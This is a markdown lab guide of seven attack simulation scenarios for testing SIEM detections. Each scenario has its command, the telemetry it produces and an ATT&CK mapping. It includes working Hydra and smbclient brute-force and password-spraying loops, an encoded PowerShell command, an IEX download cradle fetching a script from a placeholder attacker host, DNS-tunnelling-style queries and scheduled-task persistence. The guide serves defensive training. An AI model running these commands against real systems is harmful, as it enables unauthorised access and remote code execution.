# Attack simulation scenarios (7)

> **Safety:** run these ONLY inside your isolated lab (host-only network). Payloads are benign.
> Never run them against systems you do not own.

| # | Scenario | How to run (from Kali unless noted) | Telemetry produced | ATT&CK |
|---|----------|-------------------------------------|--------------------|--------|
| S1 | SMB brute force | `hydra -l labuser -P wordlist.txt smb://<WIN_IP>` | Security 4625 (Logon Type 3) | T1110.001 |
| S2 | Password spraying | `hydra -L users.txt -p 'Winter2026!' smb://<WIN_IP>` | Security 4625 across many users, one IP | T1110.003 |
| S3 | Brute force then success | Same as S1 with the real password at the end of the wordlist | 4625 x N then 4624 | T1078 |
| S4 | Encoded PowerShell | On Windows: `powershell -NoP -EncodedCommand <base64 of "whoami; hostname">` | Sysmon 1, PowerShell 4104 | T1059.001, T1027 |
| S5 | Download cradle | Kali: `python3 -m http.server 8000` (host a harmless test.ps1). Windows: `powershell -NoP -c "IEX (New-Object Net.WebClient).DownloadString('http://<KALI_IP>:8000/test.ps1')"` | Sysmon 1, 3, 22; 4104 | T1105, T1059.001 |
| S6 | DNS tunnelling-style queries | Windows: `1..200 \| % { Resolve-DnsName ("{0}.lab-test.invalid" -f (-join ((97..122) \| Get-Random -Count 24 \| % {[char]$_}))) -ErrorAction SilentlyContinue }` | Sysmon 22 (200 unique long subdomains) | T1071.004, T1568.002 |
| S7 | Scheduled task persistence | Windows (admin): `schtasks /create /tn "LabUpdater" /tr "cmd.exe /c echo test" /sc minute /mo 30` then delete it | Sysmon 1 (schtasks), Security 4698 | T1053.005 |

Optional: use **Atomic Red Team** (`Invoke-AtomicTest T1059.001`, `T1053.005`) for a second, standardised run.

## For every scenario, record
1. Time started and what you ran
2. Which detection fired, and how many minutes later
3. The investigation steps and SPL you used (screenshots go in `/screenshots`)
4. False positives / tuning you did
5. Verdict, severity and response recommendation

## Reliable alternative for S1 to S3 (no Hydra needed)
Hydra's SMB module is unreliable against Windows 10. These loops from Kali use `smbclient` (install with `sudo apt install smbclient`) and produce the same Event ID 4625 / 4624 telemetry:
```
while read p; do smbclient -L //<WIN10_IP> -U "labuser%$p" > /dev/null 2>&1; done < pw.txt          # S1 and S3
while read u; do smbclient -L //<WIN10_IP> -U "$u%Spring2026" > /dev/null 2>&1; done < users.txt      # S2
```
